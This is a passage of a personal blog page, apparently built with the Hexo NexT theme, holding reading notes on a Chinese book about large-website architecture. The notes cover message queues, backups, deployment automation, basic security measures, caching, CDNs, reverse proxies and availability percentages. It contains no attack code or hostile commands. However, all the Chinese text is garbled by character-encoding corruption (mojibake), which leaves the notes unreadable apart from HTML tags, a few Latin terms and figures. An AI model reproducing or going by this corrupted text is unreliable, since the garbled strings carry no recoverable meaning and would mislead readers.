<li>åŠ å¿«ç½‘ç«™å“åº”é€Ÿåº¦ï¼šå¤„ç†å®Œä¸šåŠ¡æ•°æ®è¯·æ±‚åï¼Œä¸éœ€è¦ç­‰å¾…æ¶ˆè´¹è€…æœåŠ¡å™¨å¤„ç†å°±å¯ä»¥è¿”å›ï¼Œç›´æ¥å†™å…¥æ¶ˆæ¯é˜Ÿåˆ—ï¼Œå“åº”å»¶è¿Ÿå‡å°‘</li>
<li>æ¶ˆé™¤å¹¶å‘é«˜å³°ï¼šå°†è¯·æ±‚æ”¾å…¥æ¶ˆæ¯é˜Ÿåˆ—ä¸­ä¾æ¬¡å¤„ç†ï¼Œå°±ä¸å¯¹å¯¹æ•´ä¸ªç½‘ç«™è´Ÿè½½é€ æˆè¿‡å¤§å‹åŠ›</li>
</ul>
<h4 id="å†—ä½™"><a href="#å†—ä½™" class="headerlink" title="å†—ä½™"></a>å†—ä½™</h4><p>ç½‘ç«™åº”è¯¥å®ç°æ•°æ®çš„å†·å¤‡ä»½å¤–ï¼Œè¿˜æœ‰çƒ­å¤‡ä»½ã€‚å³å®šæ—¶ä¿å­˜å’Œå®æ—¶ä¿å­˜æ•°æ®ï¼Œä»¥åŠç¾å¤‡æ•°æ®ä¸­å¿ƒã€‚é¿å…ç”±äºå•ä¸ªæœåŠ¡å™¨æŸååæ•°æ®æŸåã€‚</p>
<h4 id="è‡ªåŠ¨åŒ–"><a href="#è‡ªåŠ¨åŒ–" class="headerlink" title="è‡ªåŠ¨åŒ–"></a>è‡ªåŠ¨åŒ–</h4><p>ç½‘ç«™å‘å¸ƒåº”è¯¥å…·å¤‡ä»¥ä¸‹ç¯èŠ‚</p>
<ul>
<li>å‘å¸ƒè‡ªåŠ¨åŒ–</li>
<li>ä»£ç ç®¡ç†ï¼šç‰ˆæœ¬æ§åˆ¶</li>
<li>è‡ªåŠ¨åŒ–æµ‹è¯•ï¼šè‡ªåŠ¨æ£€æµ‹å¹¶å‘é€æ£€æµ‹æŠ¥å‘Š</li>
<li>è‡ªåŠ¨åŒ–å®‰å…¨æ£€æµ‹ï¼šå¯¹ä»£ç è¿›è¡Œé™æ€å®‰å…¨æ‰«æéƒ¨ç½²åŠæ”»å‡»æµ‹è¯•</li>
<li>è‡ªåŠ¨åŒ–éƒ¨ç½²ï¼šè‡ªåŠ¨éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒ</li>
<li>è‡ªåŠ¨åŒ–ç›‘æ§ï¼šç›‘æ§æœåŠ¡å™¨å®•æœºï¼Œç¨‹åºbugï¼Œå­˜å‚¨ç©ºé—´ä¸è¶³ï¼Œçªç„¶è®¿é—®é«˜å³°</li>
<li>è‡ªåŠ¨åŒ–æŠ¥è­¦ï¼šè¶…å‡ºé˜ˆå€¼å‘é€é‚®ä»¶æŠ¥è­¦</li>
<li>è‡ªåŠ¨åŒ–å¤±æ•ˆè½¬ç§»ï¼šå°†å¤±æ•ˆçš„æœåŠ¡å™¨ä»é›†ç¾¤éš”ç¦»</li>
<li>è‡ªåŠ¨åŒ–å¤±æ•ˆæ¢å¤ï¼šé‡æ–°å¯åŠ¨æœåŠ¡</li>
<li>è‡ªåŠ¨åŒ–é™çº§ï¼šè®¿é—®é«˜å³°åˆ™å…³é—­æ¬¡è¦æœåŠ¡</li>
<li>è‡ªåŠ¨åŒ–åˆ†é…èµ„æºï¼šå°†ç©ºé—²èµ„æºåˆç†åˆ†é…ç»™é‡è¦ä»»åŠ¡</li>
</ul>
<h4 id="å®‰å…¨"><a href="#å®‰å…¨" class="headerlink" title="å®‰å…¨"></a>å®‰å…¨</h4><ul>
<li>å¯†ç å’Œæ‰‹æœºæ ¡éªŒ</li>
<li>é€šä¿¡åŠ å¯†</li>
<li>éªŒè¯ç è¯†åˆ«</li>
<li>æ•æ„Ÿè¯æ±‡è¿‡æ»¤</li>
<li>é£é™©ä¿¡æ¯æ§åˆ¶</li>
</ul>
<h2 id="æ¶æ„è¦ç´ "><a href="#æ¶æ„è¦ç´ " class="headerlink" title="æ¶æ„è¦ç´ "></a>æ¶æ„è¦ç´ </h2><p>é€šä¿—è¯´æ³•ï¼šæœ€é«˜å±‚æ¬¡çš„è§„åˆ’ï¼Œéš¾ä»¥æ”¹å˜çš„å†³å®š</p>
<p>ä¸€èˆ¬è¯´æ¥ï¼Œé™¤äº†å½“å‰çš„ç³»ç»ŸåŠŸèƒ½éœ€æ±‚å¤–ï¼Œè½¯ä»¶æ¶æ„è¿˜éœ€è¦å…³æ³¨æ€§èƒ½ã€å¯ç”¨æ€§ã€ä¼¸ç¼©æ€§ã€æ‰©å±•æ€§å’Œå®‰å…¨æ€§è¿™5ä¸ªæ¶æ„è¦ç´ </p>
<ul>
<li>æ€§èƒ½ï¼šè¡¡é‡ç½‘ç«™æ€§èƒ½æœ‰ä¸€ç³»åˆ—æŒ‡æ ‡ï¼Œé‡è¦çš„æœ‰å“åº”æ—¶é—´ã€TPSã€ç³»ç»Ÿæ€§èƒ½è®¡æ•°å™¨ç­‰</li>
<li>å¯ç”¨æ€§ï¼šå¤§å‹ç½‘ç«™è‡³å°‘åˆ°99.99%ï¼Œè¡¡é‡ä¸€ä¸ªç³»ç»Ÿæ¶æ„è®¾è®¡æ˜¯å¦æ»¡è¶³é«˜å¯ç”¨çš„ç›®æ ‡ï¼Œå°±æ˜¯å‡è®¾ç³»ç»Ÿä¸­ä»»ä½•ä¸€å°æˆ–è€…å¤šå°æœåŠ¡å™¨å®•æœºæ—¶ï¼Œä»¥åŠå‡ºç°å„ç§ä¸å¯é¢„æœŸçš„é—®é¢˜æ—¶ï¼Œç³»ç»Ÿæ•´ä½“æ˜¯å¦ä¾ç„¶å¯ç”¨</li>
<li>ä¼¸ç¼©æ€§ï¼šè¡¡é‡æ¶æ„ä¼¸ç¼©æ€§çš„ä¸»è¦æ ‡å‡†å°±æ˜¯æ˜¯å¦å¯ä»¥ç”¨å¤šå°æœåŠ¡å™¨æ„å»ºé›†ç¾¤ï¼Œæ˜¯å¦å®¹æ˜“å‘é›†ç¾¤ä¸­æ·»åŠ æ–°çš„æœåŠ¡å™¨ã€‚åŠ å…¥æ–°çš„æœåŠ¡å™¨åæ˜¯å¦å¯ä»¥æä¾›å’ŒåŸæ¥çš„æœåŠ¡å™¨æ— å·®åˆ«çš„æœåŠ¡ã€‚é›†ç¾¤ä¸­å¯å®¹çº³çš„æ€»çš„æœåŠ¡å™¨æ•°é‡æ˜¯å¦æœ‰é™åˆ¶</li>
<li>æ‰©å±•æ€§ï¼šè¡¡é‡ç½‘ç«™æ¶æ„æ‰©å±•æ€§å¥½åçš„ä¸»è¦æ ‡å‡†å°±æ˜¯åœ¨ç½‘ç«™å¢åŠ æ–°çš„ä¸šåŠ¡äº§å“æ—¶ï¼Œæ˜¯å¦å¯ä»¥å®ç°å¯¹ç°æœ‰äº§å“é€æ˜æ— å½±å“ï¼Œä¸éœ€è¦ä»»ä½•æ”¹åŠ¨æˆ–è€…å¾ˆå°‘æ”¹åŠ¨æ—¢æœ‰ä¸šåŠ¡åŠŸèƒ½å°±å¯ä»¥ä¸Šçº¿æ–°äº§å“</li>
<li>å®‰å…¨æ€§ï¼šè¡¡é‡ç½‘ç«™å®‰å…¨æ¶æ„çš„æ ‡å‡†å°±æ˜¯é’ˆå¯¹ç°å­˜å’Œæ½œåœ¨çš„å„ç§æ”»å‡»ä¸çªƒå¯†æ‰‹æ®µï¼Œæ˜¯å¦æœ‰å¯é çš„åº”å¯¹ç­–ç•¥</li>
</ul>
<h2 id="ç½‘ç«™çš„é«˜æ€§èƒ½æ¶æ„"><a href="#ç½‘ç«™çš„é«˜æ€§èƒ½æ¶æ„" class="headerlink" title="ç½‘ç«™çš„é«˜æ€§èƒ½æ¶æ„"></a>ç½‘ç«™çš„é«˜æ€§èƒ½æ¶æ„</h2><h4 id="ä¸åŒè§†è§’ä¸‹çš„æ€§èƒ½"><a href="#ä¸åŒè§†è§’ä¸‹çš„æ€§èƒ½" class="headerlink" title="ä¸åŒè§†è§’ä¸‹çš„æ€§èƒ½"></a>ä¸åŒè§†è§’ä¸‹çš„æ€§èƒ½</h4><ul>
<li>ç”¨æˆ·è§†è§’çš„ç½‘ç«™æ€§èƒ½ï¼šä»ç”¨æˆ·è§’åº¦ï¼Œç½‘ç«™æ€§èƒ½å°±æ˜¯ç”¨æˆ·åœ¨æµè§ˆå™¨ä¸Šç›´è§‚æ„Ÿå—åˆ°çš„ç½‘ç«™å“åº”é€Ÿåº¦å¿«è¿˜æ˜¯æ…¢ã€‚ç”¨æˆ·æ„Ÿå—åˆ°çš„æ—¶é—´ï¼ŒåŒ…æ‹¬ç”¨æˆ·è®¡ç®—æœºå’Œç½‘ç«™æœåŠ¡å™¨é€šä¿¡çš„æ—¶é—´ã€ç½‘ç«™æœåŠ¡å™¨å¤„ç†çš„æ—¶é—´ã€ç”¨æˆ·è®¡ç®—æœºæµè§ˆå™¨æ„é€ è¯·æ±‚è§£æå“åº”æ•°æ®çš„æ—¶é—´</li>
<li>å¼€å‘äººå‘˜è§’åº¦çš„ç½‘ç«™æ€§èƒ½ï¼šæ˜¯åº”ç”¨ç¨‹åºæœ¬èº«åŠå…¶ç›¸å…³å­ç³»ç»Ÿçš„æ€§èƒ½ï¼ŒåŒ…æ‹¬å“åº”å»¶è¿Ÿã€ç³»ç»Ÿååé‡ã€å¹¶å‘å¤„ç†èƒ½åŠ›ã€ç³»ç»Ÿç¨³å®šæ€§ç­‰æŠ€æœ¯æŒ‡æ ‡ã€‚ä¸»è¦çš„ä¼˜åŒ–æ‰‹æ®µæœ‰ä½¿ç”¨ç¼“å­˜åŠ é€Ÿæ•°æ®è¯»å–ï¼Œä½¿ç”¨é›†ç¾¤æé«˜ååèƒ½åŠ›ï¼Œä½¿ç”¨å¼‚æ­¥æ¶ˆæ¯åŠ å¿«è¯·æ±‚å“åº”åŠå®ç°å‰Šå³°ï¼Œä½¿ç”¨ä»£ç ä¼˜åŒ–æ‰‹æ®µæ”¹å–„ç¨‹åºæ€§èƒ½</li>
<li>è¿ç»´è§’åº¦çš„ç½‘ç«™æ€§èƒ½ï¼šå…³æ³¨åŸºç¡€è®¾æ–½æ€§èƒ½å’Œèµ„æºåˆ©ç”¨ç‡ï¼Œå¦‚ç½‘ç»œè¿è¥å•†çš„å¸¦å®½èƒ½åŠ›ã€æœåŠ¡å™¨ç¡¬ä»¶çš„é…ç½®ã€æ•°æ®ä¸­å¿ƒç½‘ç»œæ¶æ„ã€æœåŠ¡å™¨å’Œç½‘ç»œå¸¦å®½çš„èµ„æºåˆ©ç”¨ç‡ç­‰ã€‚ä¸»è¦ä¼˜åŒ–æ‰‹æ®µæœ‰å»ºè®¾ä¼˜åŒ–éª¨å¹²ç½‘ã€ä½¿ç”¨é«˜æ€§ä»·æ¯”å®šåˆ¶æœåŠ¡å™¨ã€åˆ©ç”¨è™šæ‹ŸåŒ–æŠ€æœ¯ä¼˜åŒ–èµ„æºåˆ©ç”¨ç­‰</li>
</ul>
<h4 id="æ€§èƒ½ä¼˜åŒ–ç­–ç•¥"><a href="#æ€§èƒ½ä¼˜åŒ–ç­–ç•¥" class="headerlink" title="æ€§èƒ½ä¼˜åŒ–ç­–ç•¥"></a>æ€§èƒ½ä¼˜åŒ–ç­–ç•¥</h4><ul>
<li>æ€§èƒ½åˆ†æï¼šæ£€æŸ¥è¯·æ±‚å¤„ç†çš„å„ä¸ªç¯èŠ‚çš„æ—¥å¿—ï¼Œåˆ†æå“ªä¸ªç¯èŠ‚å“åº”æ—¶é—´ä¸åˆç†ã€è¶…è¿‡é¢„æœŸï¼›ç„¶åæ£€æŸ¥ç›‘æ§æ•°æ®ï¼Œåˆ†æå½±å“æ€§èƒ½çš„ä¸»è¦å› ç´ æ˜¯å†…å­˜ã€ç£ç›˜ã€ç½‘ç»œã€è¿˜æ˜¯CPUï¼Œæ˜¯ä»£ç é—®é¢˜è¿˜æ˜¯æ¶æ„è®¾è®¡ä¸åˆç†</li>
<li>æ€§èƒ½ä¼˜åŒ–ï¼šæ ¹æ®åˆ†å±‚æ¶æ„å¯åˆ†ä¸ºwebå‰ç«¯ä¼˜åŒ–ã€åº”ç”¨æœåŠ¡å™¨æ€§èƒ½ä¼˜åŒ–ã€å­˜å‚¨æœåŠ¡å™¨æ€§èƒ½ä¼˜åŒ–</li>
</ul>
<h4 id="å‰ç«¯ä¼˜åŒ–ç­–ç•¥"><a href="#å‰ç«¯ä¼˜åŒ–ç­–ç•¥" class="headerlink" title="å‰ç«¯ä¼˜åŒ–ç­–ç•¥"></a>å‰ç«¯ä¼˜åŒ–ç­–ç•¥</h4><ul>
<li>å‡å°‘httpè¯·æ±‚</li>
<li>ä½¿ç”¨æµè§ˆå™¨ç¼“å­˜</li>
<li>å¯åŠ¨å‹ç¼©</li>
<li>cssæ”¾åœ¨æœ€ä¸Šé¢ï¼Œjsæ”¾åœ¨é¡µé¢æœ€ä¸‹é¢</li>
<li>å‡å°‘cookieä¼ è¾“</li>
</ul>
<h4 id="CDNåŠ é€Ÿ"><a href="#CDNåŠ é€Ÿ" class="headerlink" title="CDNåŠ é€Ÿ"></a>CDNåŠ é€Ÿ</h4><p>CDNèƒ½å¤Ÿç¼“å­˜çš„ä¸€èˆ¬æ˜¯é™æ€èµ„æºï¼Œå¦‚å›¾ç‰‡ã€æ–‡ä»¶ã€CSSã€Scriptè„šæœ¬ã€é™æ€ç½‘é¡µç­‰ï¼Œä½†æ˜¯è¿™äº›æ–‡ä»¶è®¿é—®é¢‘åº¦å¾ˆé«˜ï¼Œå°†å…¶ç¼“å­˜åœ¨CDNå¯æå¤§æ”¹å–„ç½‘é¡µçš„æ‰“å¼€é€Ÿåº¦</p>
<h4 id="åå‘ä»£ç†"><a href="#åå‘ä»£ç†" class="headerlink" title="åå‘ä»£ç†"></a>åå‘ä»£ç†</h4><p>ä¼ ç»Ÿä»£ç†æœåŠ¡å™¨ä½äºæµè§ˆå™¨ä¸€ä¾§ï¼Œä»£ç†æµè§ˆå™¨å°†HTTPè¯·æ±‚å‘é€åˆ°äº’è”ç½‘ä¸Šï¼Œè€Œåå‘ä»£ç†æœåŠ¡å™¨ä½äºç½‘ç«™æœºæˆ¿ä¸€ä¾§ï¼Œä»£ç†ç½‘ç«™WebæœåŠ¡å™¨æ¥æ”¶HTTPè¯·æ±‚</p>
<h4 id="ç¼“å­˜-1"><a href="#ç¼“å­˜-1" class="headerlink" title="ç¼“å­˜"></a>ç¼“å­˜</h4><ul>
<li>åŸºæœ¬åŸç†ï¼š K-Vå½¢å¼å­˜å‚¨</li>
<li>åˆç†ä½¿ç”¨ç¼“å­˜ï¼šæ•°æ®è¯»å†™æ¯”2:1ä»¥ä¸Šä½¿ç”¨ç¼“å­˜æ‰æœ‰æ„ä¹‰</li>
<li>æ•°æ®ä¸ä¸€è‡´ä¸è„è¯»ï¼šéœ€è¦è®¾ç½®ç¼“å­˜æ—¶é—´ï¼Œåœ¨ç¼“å­˜æ—¶é—´å†…å¯æ¥å—è„è¯»</li>
<li>ç¼“å­˜å¯ç”¨æ€§ï¼šæ•°æ®åº“åœ¨é¢ä¸´ç¼“å­˜å¤±æ•ˆæ—¶å®¹æ˜“å‡ºç°è®¿é—®è¿‡å¤§å¯¼è‡´å®•æœº</li>
<li>ç¼“å­˜é¢„çƒ­ï¼šæå‰åŠ è½½ç¼“å­˜ä¿è¯ç¼“å­˜å¯ç”¨</li>
<li>ç¼“å­˜ç©¿é€ï¼šå°†valueä¸ºnullçš„æƒ…å†µä¹ŸåŠ è½½åœ¨ç¼“å­˜ä¸­</li>
</ul>
<h4 id="ä»£ç ä¼˜åŒ–"><a href="#ä»£ç ä¼˜åŒ–" class="headerlink" title="ä»£ç ä¼˜åŒ–"></a>ä»£ç ä¼˜åŒ–</h4><ul>
<li>å¤šçº¿ç¨‹ï¼šä½¿ç”¨å¤šçº¿ç¨‹å¤„ç†IOä¸å¤šcpuä¸€èˆ¬ç®—æ³•ï¼šå¤šçº¿ç¨‹æ•°=[ä»»åŠ¡æ‰§è¡Œæ—¶é—´/(ä»»åŠ¡æ‰§è¡Œæ—¶é—´-IOç­‰å¾…æ—¶é—´)]* cpuå†…æ ¸æ•°é‡</li>
<li>å°†å¯¹è±¡è®¾è®¡æˆæ— çŠ¶æ€ï¼šåœ¨å¤šå¹¶å‘æ—¶å¯¹è±¡ä¸ä¼šå› å¤šçº¿ç¨‹å¯¼è‡´çŠ¶æ€æ”¹å˜</li>
<li>ä½¿ç”¨å±€éƒ¨å¯¹è±¡ï¼šåœ¨æ–¹æ³•å†…åˆ›å»ºå¯¹è±¡</li>
<li>å¹¶å‘è®¿é—®ä½¿ç”¨é”ï¼šé”å°†å¹¶å‘æ“ä½œè½¬åŒ–ä¸ºé¡ºåºæ“ä½œ</li>
<li>èµ„æºå¤ç”¨ï¼šä½¿ç”¨å•ä¾‹æ¨¡å¼å’Œå¯¹è±¡æ± </li>
<li>æ•°æ®ç»“æ„ï¼šä½¿ç”¨æ•°æ®ç»“æ„+ç®—æ³•çš„å½¢å¼ä¼˜åŒ–ä»£ç å¯ä»¥æå¤§çš„ä¼˜åŒ–æ€§èƒ½</li>
<li>åƒåœ¾å›æ”¶ï¼šåƒåœ¾å›æ”¶æœºåˆ¶æœ‰åˆ©äºæ€§èƒ½æå‡</li>
</ul>
<h2 id="ç½‘ç«™é«˜å¯ç”¨æ¶æ„"><a href="#ç½‘ç«™é«˜å¯ç”¨æ¶æ„" class="headerlink" title="ç½‘ç«™é«˜å¯ç”¨æ¶æ„"></a>ç½‘ç«™é«˜å¯ç”¨æ¶æ„</h2><h4 id="ç½‘ç«™é«˜å¯ç”¨æ€§åº¦é‡"><a href="#ç½‘ç«™é«˜å¯ç”¨æ€§åº¦é‡" class="headerlink" title="ç½‘ç«™é«˜å¯ç”¨æ€§åº¦é‡"></a>ç½‘ç«™é«˜å¯ç”¨æ€§åº¦é‡</h4><p>ç½‘ç«™ä¸å¯ç”¨æ—¶é—´ï¼ˆæ•…éšœæ—¶é—´ï¼‰=æ•…éšœä¿®å¤æ—¶é—´ç‚¹-æ•…éšœå‘ç°ï¼ˆæŠ¥å‘Šï¼‰æ—¶é—´ç‚¹</p>
<p>ç½‘ç«™å¹´åº¦å¯ç”¨æ€§æŒ‡æ ‡=ï¼ˆ1-ç½‘ç«™ä¸å¯ç”¨æ—¶é—´/å¹´åº¦æ€»æ—¶é—´ï¼‰Ã—100%</p>
<p>å¯¹äºå¤§å¤šæ•°ç½‘ç«™è€Œè¨€ï¼Œ2ä¸ª9æ˜¯åŸºæœ¬å¯ç”¨ï¼Œç½‘ç«™å¹´åº¦ä¸å¯ç”¨æ—¶é—´å°äº88å°æ—¶ï¼›3ä¸ª9æ˜¯è¾ƒé«˜å¯ç”¨ï¼Œç½‘ç«™å¹´åº¦ä¸å¯ç”¨æ—¶é—´å°äº9å°æ—¶ï¼›4ä¸ª9æ˜¯å…·æœ‰è‡ªåŠ¨æ¢å¤èƒ½åŠ›çš„é«˜å¯ç”¨ï¼Œç½‘ç«™å¹´åº¦ä¸å¯ç”¨æ—¶é—´å°äº53åˆ†é’Ÿï¼›5ä¸ª9æ˜¯æé«˜å¯ç”¨æ€§ï¼Œç½‘ç«™å¹´åº¦ä¸å¯ç”¨æ—¶é—´å°äº5åˆ†é’Ÿã€‚</p>
<h4 id="ç½‘ç«™å¯ç”¨æ€§è€ƒæ ¸"><a href="#ç½‘ç«™å¯ç”¨æ€§è€ƒæ ¸" class="headerlink" title="ç½‘ç«™å¯ç”¨æ€§è€ƒæ ¸"></a>ç½‘ç«™å¯ç”¨æ€§è€ƒæ ¸</h4><p><img src="/éšç¬”/ã€Šå¤§å‹ç½‘ç«™æŠ€æœ¯æ¶ã€‹è¯»ä¹¦ç¬”è®°/./useWeight.jpeg" alt></p>
<p>æ•…éšœåˆ†=æ•…éšœæ—¶é—´ï¼ˆåˆ†é’Ÿï¼‰Ã— æ•…éšœæƒé‡</p>
<h4 id="é«˜å¯ç”¨çš„æœåŠ¡"><a href="#é«˜å¯ç”¨çš„æœåŠ¡" class="headerlink" title="é«˜å¯ç”¨çš„æœåŠ¡"></a>é«˜å¯ç”¨çš„æœåŠ¡</h4><ul>
<li>æœåŠ¡å™¨åˆ†çº§ï¼šå°†æœåŠ¡å™¨åˆ†ä¸åŒçº§åˆ«ï¼Œæ ¸å¿ƒåº”ç”¨å’ŒæœåŠ¡ä¼˜å…ˆä½¿ç”¨æ›´å¥½çš„æœåŠ¡å™¨</li>
<li>è¶…æ—¶è®¾ç½®ï¼šç”±äºå®•æœºæˆ–æ­»é”ç­‰å…¶ä»–æƒ…å†µï¼Œè¶…æ—¶åå¯è®¾ç½®è°ƒåº¦åˆ°å…¶ä»–æœåŠ¡å™¨</li>
<li>å¼‚æ­¥è°ƒç”¨ï¼šå¼‚æ­¥è°ƒç”¨å‡å°‘æœåŠ¡å™¨å‹åŠ›</li>
<li>æœåŠ¡é™çº§ï¼šé«˜å³°æœŸä½¿ç”¨æœåŠ¡å™¨é™çº§ï¼Œæ‹’ç»æœåŠ¡ï¼ˆæ‹’ç»éƒ¨åˆ†è¯·æ±‚ï¼‰æˆ–å…³é—­æœåŠ¡ï¼ˆå…³é—­éæ ¸å¿ƒæœåŠ¡ï¼‰</li>
<li>å¹‚ç­‰æ€§è®¾è®¡ï¼šæœåŠ¡å±‚å¿…é¡»ä¿è¯å¤šæ¬¡è°ƒç”¨å’Œä¸€æ¬¡è°ƒç”¨ç»“æœä¸€è‡´</li>
</ul>
<h4 id="æ•°æ®å¯ç”¨æ€§"><a href="#æ•°æ®å¯ç”¨æ€§" class="headerlink" title="æ•°æ®å¯ç”¨æ€§"></a>æ•°æ®å¯ç”¨æ€§</h4><ul>
<li>æ•°æ®æŒä¹…æ€§ï¼š å¤šä¸ªå‰¯æœ¬ï¼Œåœ¨æŸä¸ªå­˜å‚¨å‡ºé”™åæ•°æ®ä¸ä¼šä¸¢å¤±</li>
<li>æ•°æ®å¯è®¿é—®æ€§ï¼šåˆ‡æ¢æ•°æ®æºæ—¶ç”¨æˆ·æ— æ„ŸçŸ¥</li>
<li>æ•°æ®ä¸€è‡´æ€§ï¼šä¸åŒå‰¯æœ¬ä¿è¯æ•°æ®ä¸€è‡´</li>
</ul>
<h4 id="ç½‘ç«™è¿è¡Œç›‘æ§"><a href="#ç½‘ç«™è¿è¡Œç›‘æ§" class="headerlink" title="ç½‘ç«™è¿è¡Œç›‘æ§"></a>ç½‘ç«™è¿è¡Œç›‘æ§</h4><p>ä¸å…è®¸æ²¡æœ‰ç›‘æ§çš„ç³»ç»Ÿä¸Šçº¿</p>
<ul>
<li>ç”¨æˆ·è¡Œä¸ºæ—¥å¿—æ”¶é›†</li>
<li>æœåŠ¡å™¨ç«¯æ—¥å¿—æ”¶é›†</li>
<li>å®¢æˆ·ç«¯æµè§ˆå™¨æ—¥å¿—æ”¶é›†</li>
<li>æœåŠ¡å™¨æ€§èƒ½ç›‘æ§</li>
<li>è¿è¡Œæ•°æ®æŠ¥å‘Š</li>
</ul>
<h5 id="å°ç»“ï¼šç½‘ç«™çš„åŸºæœ¬æ¶æ„åŠä¼˜åŒ–æ–¹å¼ï¼Œæ˜¯ä¸€ç›´ä»¥æ¥æˆ‘æ¯”è¾ƒæ¨¡ç³Šçš„åœ°æ–¹ã€‚è¿™æœ¬ä¹¦é€šè¿‡é€å½»çš„è§£æï¼Œè®©æˆ‘æ›´åŠ æ·±åˆ»çš„æ˜ç™½ç½‘ç«™çš„æ¶æ„æŠ€æœ¯ã€‚å¯¹äºè´Ÿè½½å‡è¡¡æˆ‘è®¤ä¸ºæ˜¯æ¯”è¾ƒé‡è¦çš„ä¸€éƒ¨åˆ†ã€‚åº”è¯¥è‡ªæˆç« èŠ‚ï¼Œåå¤éªŒè¯ã€‚"><a href="#å°ç»“ï¼šç½‘ç«™çš„åŸºæœ¬æ¶æ„åŠä¼˜åŒ–æ–¹å¼ï¼Œæ˜¯ä¸€ç›´ä»¥æ¥æˆ‘æ¯”è¾ƒæ¨¡ç³Šçš„åœ°æ–¹ã€‚è¿™æœ¬ä¹¦é€šè¿‡é€å½»çš„è§£æï¼Œè®©æˆ‘æ›´åŠ æ·±åˆ»çš„æ˜ç™½ç½‘ç«™çš„æ¶æ„æŠ€æœ¯ã€‚å¯¹äºè´Ÿè½½å‡è¡¡æˆ‘è®¤ä¸ºæ˜¯æ¯”è¾ƒé‡è¦çš„ä¸€éƒ¨åˆ†ã€‚åº”è¯¥è‡ªæˆç« èŠ‚ï¼Œåå¤éªŒè¯ã€‚" class="headerlink" title="å°ç»“ï¼šç½‘ç«™çš„åŸºæœ¬æ¶æ„åŠä¼˜åŒ–æ–¹å¼ï¼Œæ˜¯ä¸€ç›´ä»¥æ¥æˆ‘æ¯”è¾ƒæ¨¡ç³Šçš„åœ°æ–¹ã€‚è¿™æœ¬ä¹¦é€šè¿‡é€å½»çš„è§£æï¼Œè®©æˆ‘æ›´åŠ æ·±åˆ»çš„æ˜ç™½ç½‘ç«™çš„æ¶æ„æŠ€æœ¯ã€‚å¯¹äºè´Ÿè½½å‡è¡¡æˆ‘è®¤ä¸ºæ˜¯æ¯”è¾ƒé‡è¦çš„ä¸€éƒ¨åˆ†ã€‚åº”è¯¥è‡ªæˆç« èŠ‚ï¼Œåå¤éªŒè¯ã€‚"></a>å°ç»“ï¼šç½‘ç«™çš„åŸºæœ¬æ¶æ„åŠä¼˜åŒ–æ–¹å¼ï¼Œæ˜¯ä¸€ç›´ä»¥æ¥æˆ‘æ¯”è¾ƒæ¨¡ç³Šçš„åœ°æ–¹ã€‚è¿™æœ¬ä¹¦é€šè¿‡é€å½»çš„è§£æï¼Œè®©æˆ‘æ›´åŠ æ·±åˆ»çš„æ˜ç™½ç½‘ç«™çš„æ¶æ„æŠ€æœ¯ã€‚å¯¹äºè´Ÿè½½å‡è¡¡æˆ‘è®¤ä¸ºæ˜¯æ¯”è¾ƒé‡è¦çš„ä¸€éƒ¨åˆ†ã€‚åº”è¯¥è‡ªæˆç« èŠ‚ï¼Œåå¤éªŒè¯ã€‚</h5>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">gdccwxx</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">31</span>
                  <span class="site-state-item-name">æ—¥å¿—</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">14</span>
                  <span class="site-state-item-name">æ ‡ç­¾</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/gdccwxx" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:765553928@qq.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">gdccwxx</span>

  
</div>









        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  
<script>
